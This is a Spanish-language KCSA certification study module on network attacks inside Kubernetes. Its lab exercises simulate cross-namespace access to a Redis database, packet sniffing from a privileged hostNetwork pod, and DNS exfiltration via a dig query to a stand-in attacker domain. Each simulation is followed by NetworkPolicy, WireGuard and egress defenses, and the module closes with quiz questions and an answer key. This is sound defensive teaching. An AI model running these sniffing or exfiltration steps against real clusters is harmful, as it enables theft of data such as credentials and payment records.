# Tema 4.5: Atacante en la Red (Material del Examen KCSA)

**Dominio:** Kubernetes & Cloud Native Security Associate (KCSA)  
**Ponderación:** 2.29%  
**Nivel Objetivo:** Senior SRE / Principal Platform Architect  

---

## Análisis Técnico Profundo y Mecánica de la Arquitectura

Cuando un adversario obtiene acceso inicial a una carga de trabajo en contenedor (por ejemplo, a través de Ejecución Remota de Código [RCE] o una aplicación web comprometida), la infraestructura de red del cluster se convierte en el vector primario para el reconocimiento, el movimiento lateral, la exfiltración de datos y los ataques de Hombre en el Medio (MitM).

```
                    +-------------------------------------------------------------+
                    |                      COMPROMISED POD                        |
                    | namespace: default                                          |
                    | IP: 10.244.1.15                                             |
                    | Attack Vector: RCE / Reverse Shell                          |
                    +-------------------------------------------------------------+
                                      |                      |
            1. Packet Sniffing /      |                      | 2. Unrestricted DNS
               Unencrypted Traffic    |                      |    Exfiltration Query
                                      v                      v
                    +--------------------+        +--------------------+
                    |  PAYMENT SERVICE   |        |  CoreDNS / Node    |
                    | namespace: finance |        | 10.96.0.10         |
                    | IP: 10.244.2.40    |        +--------------------+
                    +--------------------+                   |
                                                             | 3. Tunneling Out
                                                             v
                                                  +--------------------+
                                                  | External C2 Server |
                                                  | 198.51.100.7:53    |
                                                  +--------------------+
```

### 1. Vectores de Ataque en Redes Planas no Segmentadas
La red estándar de Kubernetes se basa en un modelo plano de IP-por-Pod donde cualquier Pod puede comunicarse con cualquier otro Pod a través de los namespaces de forma predeterminada (según lo exigido por la especificación de CNI).

*   **ARP Spoofing / IP Spoofing:** En CNIs heredadas basadas en bridges (por ejemplo, `bridge` estándar o `flannel` sin configurar), las interfaces de los contenedores comparten un dominio L2. Un atacante puede enviar respuestas ARP falsificadas para redirigir el tráfico destinado a otro Pod a través del Pod comprometido.
*   **Packet Sniffing (Eavesdropping):** Sin encriptación en tránsito (mTLS, IPsec o WireGuard), el tráfico en texto plano de HTTP, gRPC o protocolos de base de datos no encriptados que cruzan redes superpuestas (overlay) (VXLAN, Geneve) se puede capturar usando `tcpdump` o capabilities de socket raw (`CAP_NET_RAW`).
*   **Movimiento Lateral:** Un atacante realiza escaneo de puertos en bloques CIDR internos (`10.244.0.0/16`) para descubrir endpoints de métricas expuestos (por ejemplo, exporters de Prometheus en el puerto `9100`), cachés de Redis sin autenticación o puertos de solo lectura de Kubelet (`10255`).
*   **Tunelización DNS y Exfiltración:** CoreDNS enruta todo el tráfico estándar del puerto 53 UDP/TCP. Los Pods comprometidos pueden codificar datos sensibles en subdominios (por ejemplo, `exfil.<base64-payload>.attacker.com`), evadiendo los filtros de egress HTTP estándar.

### 2. Planos de Control de Defensa en Profundidad
*   **Segmentación en Capa 3/4 (API de NetworkPolicy):** Implementada por plugins de CNI (Cilium, Calico) a través de `iptables`, `ipsets` o programas eBPF cargados en los hooks del par veth (`tc` o `XDP`).
*   **Visibilidad en Capa 7 y Encriptación en Tránsito:** Proporcionadas por Service Meshes (Istio, Linkerd) utilizando proxies sidecar/ambient (Envoy) o de forma nativa en L3/L4 mediante la encriptación transparente de eBPF del CNI (WireGuard/IPsec).
*   **Eliminación de Capabilities:** Eliminar `CAP_NET_RAW` y `CAP_NET_ADMIN` a través del `securityContext` del Pod evita que los atacantes que no son root abran sockets raw o se vinculen a interfaces de bajo nivel.

---

## Ejercicios Guiados

### Requisitos Previos
Necesitás un cluster de Kubernetes en ejecución (v1.28+) con un CNI compatible con NetworkPolicy (como Cilium o Calico) instalado, y `kubectl` configurado con acceso de cluster-admin.

---

### Ejercicio 1: Simulación de Eavesdropping y Restricción del Movimiento Lateral Mediante NetworkPolicies

#### Paso 1: Desplegar la Arquitectura Vulnerable (Comunicación en Texto Plano)
Creá un namespace `finance` y desplegá una base de datos junto a un Pod de aplicación.

```bash
kubectl create namespace finance
kubectl create namespace attacker-zone
```

Aplicá el siguiente manifiesto completo para crear una base de datos objetivo y un cliente vulnerable:

```yaml
# manifest-ex1-target.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: payment-db
  namespace: finance
  labels:
    app: payment-db
    tier: backend
spec:
  replicas: 1
  selector:
    matchLabels:
      app: payment-db
  template:
    metadata:
      labels:
        app: payment-db
        tier: backend
    spec:
      containers:
      - name: db
        image: redis:7.2-alpine
        ports:
        - containerPort: 6379
          name: redis
---
apiVersion: v1
kind: Service
metadata:
  name: payment-db-svc
  namespace: finance
spec:
  ports:
  - port: 6379
    targetPort: 6379
  selector:
    app: payment-db
```

Ejecutá el despliegue:

```bash
kubectl apply -f manifest-ex1-target.yaml
```

**Salida Esperada:**
```text
deployment.apps/payment-db created
service/payment-db-svc created
```

#### Paso 2: Desplegar el Pod Comprometido en Otro Namespace
Desplegá un contenedor no confiable en `attacker-zone`.

```yaml
# manifest-ex1-attacker.yaml
apiVersion: v1
kind: Pod
metadata:
  name: rogue-pod
  namespace: attacker-zone
  labels:
    app: rogue-workload
spec:
  containers:
  - name: attacker
    image: nicolaka/netshoot:latest
    command: ["sleep", "3600"]
    securityContext:
      capabilities:
        add: ["NET_RAW", "NET_ADMIN"]
```

Ejecutá el despliegue:

```bash
kubectl apply -f manifest-ex1-attacker.yaml
kubectl wait --for=condition=Ready pod/rogue-pod -n attacker-zone --timeout=60s
```

#### Paso 3: Ejecutar Reconocimiento Lateral y Acceso a Datos
Desde `rogue-pod`, escaneá y accedé a `payment-db-svc` a través de los límites del namespace.

```bash
kubectl exec -it rogue-pod -n attacker-zone -- nc -zv payment-db-svc.finance.svc.cluster.local 6379
```

**Salida Esperada:**
```text
payment-db-svc.finance.svc.cluster.local (10.96.142.88:6379) open
```

Exfiltrá datos directamente desde la base de datos no segmentada:

```bash
kubectl exec -it rogue-pod -n attacker-zone -- redis-cli -h payment-db-svc.finance.svc.cluster.local SET credit_card "4532-xxxx-xxxx-8921"
kubectl exec -it rogue-pod -n attacker-zone -- redis-cli -h payment-db-svc.finance.svc.cluster.local GET credit_card
```

**Salida Esperada:**
```text
OK
"4532-xxxx-xxxx-8921"
```

#### Paso 4: Aplicar Segregación de Red Zero-Trust
Aplicá una NetworkPolicy de Default-Deny Ingress y Egress en el namespace `finance`, y permití explícitamente el tráfico solo desde cargas de trabajo frontend autorizadas dentro del mismo namespace.

```yaml
# manifest-ex1-policy.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: finance
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-redis-from-approved-frontend
  namespace: finance
spec:
  podSelector:
    matchLabels:
      app: payment-db
  policyTypes:
  - Ingress
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: payment-frontend
      namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: finance
    ports:
    - protocol: TCP
      port: 6379
```

Aplicá las políticas:

```bash
kubectl apply -f manifest-ex1-policy.yaml
```

**Salida Esperada:**
```text
networkpolicy.networking.k8s.io/default-deny-all created
networkpolicy.networking.k8s.io/allow-redis-from-approved-frontend created
```

#### Paso 5: Verificar la Aplicación del Aislamiento
Volvé a probar el acceso desde `rogue-pod`:

```bash
kubectl exec -it rogue-pod -n attacker-zone -- nc -zv -w 3 payment-db-svc.finance.svc.cluster.local 6379
```

**Salida Esperada:**
```text
nc: payment-db-svc.finance.svc.cluster.local (10.96.142.88:6379): Operation timed out
```

---

### Preguntas de Verificación - Sección 1

1. ¿Por qué un cluster de Kubernetes estándar sin un controlador de NetworkPolicy de CNI permite la comunicación entre namespaces de forma predeterminada?
2. En `manifest-ex1-policy.yaml`, ¿cuál es el impacto de seguridad si se omite `namespaceSelector` bajo la regla `from` en `allow-redis-from-approved-frontend`?
3. ¿Cómo afecta a un atacante en la red de contenedores la eliminación de `CAP_NET_RAW` a través del `securityContext` del contenedor?

---

### Ejercicio 2: Detección y Mitigación de Tráfico en Tránsito No Encriptado

#### Paso 1: Capturar Tráfico en Texto Plano Mediante un Pod de Diagnóstico
Demostrá cómo un atacante en el mismo Nodo (o con acceso a la red del host) puede hacer sniffing del tráfico de la veth del Pod cuando la encriptación está deshabilitada.

Identificá el nodo objetivo para `payment-db`:

```bash
NODE_NAME=$(kubectl get pod -l app=payment-db -n finance -o jsonpath='{.items[0].spec.nodeName}')
POD_IP=$(kubectl get pod -l app=payment-db -n finance -o jsonpath='{.items[0].spec.podIP}')
echo "Target Node: ${NODE_NAME}, Target Pod IP: ${POD_IP}"
```

#### Paso 2: Simular la Captura de Paquetes en Tránsito
Desplegá un contenedor de diagnóstico adjunto a la red del host del nodo objetivo para simular a un atacante con acceso a nivel de nodo o un contenedor ejecutándose con `hostNetwork: true`.

```yaml
# manifest-ex2-sniffer.yaml
apiVersion: v1
kind: Pod
metadata:
  name: node-sniffer
  namespace: kube-system
spec:
  hostNetwork: true
  nodeName: NODE_NAME_PLACEHOLDER
  containers:
  - name: tshark
    image: nicolaka/netshoot:latest
    command: ["tshark", "-i", "any", "-Y", "redis", "-a", "duration:30"]
    securityContext:
      privileged: true
```

Reemplazá `NODE_NAME_PLACEHOLDER` y ejecutá:

```bash
sed "s/NODE_NAME_PLACEHOLDER/${NODE_NAME}/" manifest-ex2-sniffer.yaml | kubectl apply -f -
```

Generá tráfico en paralelo:

```bash
kubectl run test-client --image=redis:7.2-alpine -n finance -- labels="app=payment-frontend" -- redis-cli -h payment-db-svc.finance.svc.cluster.local SET secret_token "SuperSecret123"
```

Revisá los logs del sniffer para ver el payload sensible capturado en texto plano:

```bash
kubectl logs pod/node-sniffer -n kube-system
```

**Salida Esperada (Snippet):**
```text
  1 0.000000000  10.244.1.22 -> 10.244.1.15  RESP 79 Request: SET secret_token SuperSecret123
  2 0.001241021  10.244.1.15 -> 10.244.1.22  RESP 22 Response: +OK
```

#### Paso 3: Implementar Encriptación Transparente de CNI (Ejemplo con Cilium WireGuard)
Para remediar el sniffing de paquetes a través de los límites del host sin alterar el código de la aplicación, habilitá la encriptación transparente a nivel de CNI (por ejemplo, WireGuard o IPsec).

Habilitá WireGuard en Cilium mediante la modificación del ConfigMap o la actualización de los valores de Helm:

```bash
kubectl patch configmap cilium-config -n kube-system --type merge -p '{"data":{"enable-wireguard":"true"}}'
kubectl rollout restart daemonset/cilium -n kube-system
kubectl rollout status daemonset/cilium -n kube-system
```

#### Paso 4: Verificar la Aplicación de la Encriptación
Verificá el estado del agente de Cilium para confirmar el intercambio de claves de WireGuard y el establecimiento del enlace:

```bash
CILIUM_POD=$(kubectl get pods -n kube-system -l k8s-app=cilium -o jsonpath='{.items[0].metadata.name}')
kubectl exec -n kube-system ${CILIUM_POD} -- cilium status | grep Encryption
```

**Salida Esperada:**
```text
Encryption: WireGuard [NodeEncryption: Disabled, WireGuardMode: opt-in/strict]
```

Inspeccioná el estado de la interfaz de WireGuard en el host:

```bash
kubectl exec -n kube-system ${CILIUM_POD} -- wg show
```

**Salida Esperada:**
```text
interface: cilium_wg0
  public key: 4xK...=
  listening port: 51871

peer: Wx7...=
  endpoint: 192.168.1.50:51871
  allowed ips: 10.244.1.0/24
  latest handshake: 12 seconds ago
  transfer: 1.42 KiB received, 1.88 KiB sent
```

---

### Preguntas de Verificación - Sección 2

1. ¿Cuál es la diferencia fundamental entre mTLS en Capa 7 (por ejemplo, sidecars Envoy de Istio) y la encriptación CNI en Capa 3/4 (por ejemplo, Cilium WireGuard)?
2. Si un atacante obtiene `privileged: true` o `CAP_NET_RAW` dentro de un Pod que se ejecuta en `hostNetwork: true`, ¿pueden las `NetworkPolicies` estándar de Kubernetes bloquear sus capacidades de sniffing? ¿Por qué sí o por qué no?

---

### Ejercicio 3: Mitigación de Exfiltración por DNS y Redirección DNS Maliciosa

#### Paso 1: Simular Exfiltración por DNS
Los atacantes a menudo usan solicitudes DNS personalizadas para transmitir datos codificados fuera del cluster.

```bash
# Execute encoded DNS query simulating exfiltration from rogue pod
kubectl exec -it rogue-pod -n attacker-zone -- dig +short exfil-payload-data-chunk1.attacker-controlled-domain.com @10.96.0.10
```

#### Paso 2: Implementar NetworkPolicy de Egress para el Bloqueo de DNS
Restringí el tráfico DNS de Egress (UDP/TCP 53) strictly a la IP de Service oficial de `kube-dns` / `CoreDNS`, bloqueando las conexiones salientes directas a servidores DNS externos (por ejemplo, `8.8.8.8`).

```yaml
# manifest-ex3-dns-egress.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-dns-egress
  namespace: finance
spec:
  podSelector: {}
  policyTypes:
  - Egress
  egress:
  # Allow egress ONLY to CoreDNS pods in kube-system on port 53
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: kube-system
      podSelector:
        matchLabels:
          k8s-app: kube-dns
    ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
  # Allow internal intra-namespace traffic
  - to:
    - podSelector: {}
```

Aplicá la política de Egress:

```bash
kubectl apply -f manifest-ex3-dns-egress.yaml
```

**Salida Esperada:**
```text
networkpolicy.networking.k8s.io/restrict-dns-egress created
```

#### Paso 3: Probar la Prevención de Bypass de DNS Saliente Directo
Intentá consultar un resolver externo directamente (`8.8.8.8`) desde el namespace `finance` para verificar el bloqueo de la ejecución:

```bash
kubectl run test-bypass --image=nicolaka/netshoot -n finance -it --rm -- dig @8.8.8.8 google.com +time=2
```

**Salida Esperada:**
```text
;; connection timed out; no servers could be reached
```

Intentá consultar el DNS interno estándar (enrutado a través de CoreDNS):

```bash
kubectl run test-valid --image=nicolaka/netshoot -n finance -it --rm -- nslookup payment-db-svc.finance.svc.cluster.local
```

**Salida Esperada:**
```text
Server:		10.96.0.10
Address:	10.96.0.10#53

Name:	payment-db-svc.finance.svc.cluster.local
Address: 10.96.142.88
```

---

### Preguntas de Verificación - Sección 3

1. ¿Por qué restringir el Egress a `10.96.0.10:53` (IP de Service de CoreDNS) mediante NetworkPolicies estándar es insuficiente por sí solo para prevenir la exfiltración por DNS si se permite que CoreDNS resuelva dominios externos de forma recursiva?
2. ¿Cómo mejora NodeLocal DNSCache tanto el rendimiento de la red como la postura de seguridad contra la suplantación de identidad (spoofing) / eavesdropping de DNS?

---

## Referencia de Forensia en Producción y Resolución de Problemas

### Comandos de Diagnóstico Esenciales para Ataques de Red

| Métrica / Objetivo | Comando de Inspección | Propósito Forense |
| :--- | :--- | :--- |
| **Conexiones Activas** | `kubectl exec -it <pod> -- ss -tupn` | Detectar conexiones de socket salientes sospechosas hacia IPs externas desconocidas. |
| **Captura de Interfaz** | `kubectl exec -it <pod> -- tcpdump -nn -i eth0 -c 100 -w /tmp/out.pcap` | Capturar datos PCAP crudos directamente desde dentro del namespace de red de un contenedor. |
| **Filtro de Socket eBPF** | `cilium monitor --type drop` | Rastrear paquetes de red descartados por reglas de eBPF en tiempo real con códigos de razón. |
| **Reglas de iptables** | `iptables-save -t filter \| grep KUBE-POD-FW` | Auditar la generación de cadenas de firewall de CNI heredadas en el nodo. |
| **Auditoría de Consultas DNS** | `kubectl logs -n kube-system -l k8s-app=kube-dns --tail=100 \| grep DENIED` | Identificar búsquedas DNS maliciosas cuando el plugin `log` o `dnstap` de CoreDNS está activo. |

### Ejemplo de Salida Real del Monitoreo de Descartes de eBPF (Cilium CLI)

```bash
kubectl exec -n kube-system daemonset/cilium -- cilium monitor --type drop
```

**Salida Esperada:**
```text
xx drop (Policy denied) flow 0x3d02a0a2 to endpoint 5412, via eth0: 10.244.3.12:48392 -> 10.244.1.15:6379 tcp SYN
xx drop (Policy denied) flow 0x8a92f1b0 to endpoint 0, via cilium_host: 10.244.3.12:53210 -> 8.8.8.8:53 udp
```

---

## Referencias Oficiales y Documentación

*   **Kubernetes Network Policies:** [https://kubernetes.io/docs/concepts/services-networking/network-policies/](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
*   **CNCF KCSA Exam Curriculum:** [https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf](https://github.com/cncf/curriculum/raw/master/KCSA%20Curriculum.pdf)
*   **Cilium WireGuard Encryption Mechanics:** [https://docs.cilium.io/en/stable/security/network/encryption-wireguard/](https://docs.cilium.io/en/stable/security/network/encryption-wireguard/)
*   **CoreDNS Security & Plug-ins:** [https://coredns.io/manual/toc/](https://coredns.io/manual/toc/)
*   **OWASP Kubernetes Top 10 - Insecure Networking:** [https://owasp.org/www-project-kubernetes-top-ten/](https://owasp.org/www-project-kubernetes-top-ten/)

---

## Soluciones de Verificación

<details>
<summary><strong>Hacé clic para desplegar la Clave de Respuestas y Explicaciones Detalladas</strong></summary>

### Respuestas de la Sección 1

1. **Comportamiento Predeterminado del CNI:**  
   El Modelo de Red de Kubernetes exige que todos los Pods deben poder comunicarse con todos los demás Pods en todos los nodos sin NAT. A menos que un controlador de `NetworkPolicy` esté activo y un Pod esté explícitamente "seleccionado" por una política, todas las interfaces de ingress y egress permanecen en un estado no aislado.

2. **Omisión de `namespaceSelector`:**  
   Si se omite `namespaceSelector`, el `podSelector` coincide con Pods con `app: payment-frontend` en **cualquier** namespace de todo el cluster. A un atacante que cree un Pod etiquetado como `app: payment-frontend` en un namespace completamente no confiable (por ejemplo, `sandbox` o `dev`) se le concedería acceso completo de ingress de red a la base de datos Redis de producción.

3. **Impacto de eliminar `CAP_NET_RAW`:**  
   `CAP_NET_RAW` permite que un proceso cree sockets RAW y PACKET, lo que permite la generación arbitraria de paquetes (ICMP, spoofing de ARP) y la captura de paquetes de bajo nivel (`tcpdump` escuchando en `eth0`). Eliminar `CAP_NET_RAW` a través del `securityContext` del contenedor evita que los atacantes que no son root dentro de un contenedor inicien el sniffing de sockets o elaboren tramas ARP falsificadas.

---

### Respuestas de la Sección 2

1. **mTLS en L7 vs Encriptación CNI en L3/L4:**  
   *   **mTLS en Capa 7 (Envoy/Istio):** Termina las conexiones TLS a nivel de proxy en el espacio de usuario. Soporta enrutamiento granular de rutas/cabeceras HTTP, aserción de identidad mediante certificados SPIFFE/SPIRE y autenticación mutua. Sin embargo, incurre en un mayor sobrecosto (overhead) de CPU y latencia debido a los cambios de contexto del proxy.
   *   **Encriptación CNI en Capa 3/4 (WireGuard/IPsec):** Encripta todo el tráfico IP superpuesto (overlay) de host a host en el espacio del kernel (a través de la API crypto de Linux o eBPF). Es completamente transparente para las aplicaciones, maneja tráfico que no es TCP/UDP de forma nativa y opera con un sobrecosto de rendimiento mínimo, pero carece de visibilidad en la capa de aplicación L7 o de controles de acceso a nivel de HTTP.

2. **Eficacia de NetworkPolicy en `hostNetwork: true`:**  
   No. Las `NetworkPolicies` estándar de Kubernetes se aplican a las interfaces veth asociadas con los namespaces de red del Pod creados por el CNI. Un Pod que se ejecuta con `hostNetwork: true` usa el namespace de red root del Nodo de Kubernetes (`eth0`, `cni0`). Las NetworkPolicies estándar basadas en `podSelector` no pueden filtrar el tráfico que atraviesa las interfaces nativas del host a menos que el CNI soporte explícitamente NetworkPolicies a nivel de Nodo (por ejemplo, `CiliumNodeConfig` o Calico Host Endpoints).

---

### Respuestas de la Sección 3

1. **Bypass de Exfiltración por CoreDNS:**  
   Restringir el Egress a la IP de CoreDNS (`10.96.0.10:53`) garantiza que los Pods no puedan alcanzar directamente los servidores DNS públicos (por ejemplo, `8.8.8.8`). Sin embargo, si el propio CoreDNS está configurado para reenviar recursivamente consultas ajenas al cluster a resolvers públicos ascendentes (por ejemplo, `/etc/resolv.conf` del host), un atacante aún puede realizar exfiltración por DNS consultando `subdominio-arbitrario.attacker.com` a través de CoreDNS. CoreDNS resolverá la consulta en nombre del atacante, actuando efectivamente como un proxy de exfiltración abierto. La mitigación requiere firewalling de DNS, políticas de Egress por FQDN (`toFQDNs` de Cilium) o filtrado de respuestas.

2. **Seguridad y Rendimiento de NodeLocal DNSCache:**  
   NodeLocal DNSCache ejecuta un agente de almacenamiento en caché de DNS en cada nodo como un `DaemonSet` (usando una IP link-local como `169.254.20.10`).  
   *   **Rendimiento:** Las consultas evitan los cuellos de botella de búsqueda en la tabla NAT de conntrack y la latencia de red entre nodos al terminar en la interfaz local de loopback/veth.  
   *   **Seguridad:** Reduce la superficie de ataque para el sniffing de paquetes entre nodos y la suplantación de caché (cache poisoning) de DNS, ya que las consultas DNS permanecen dentro del límite de memoria aislado del nodo en lugar de atravesar túneles superpuestos (overlay) no encriptados hacia un Pod de CoreDNS remoto.

</details>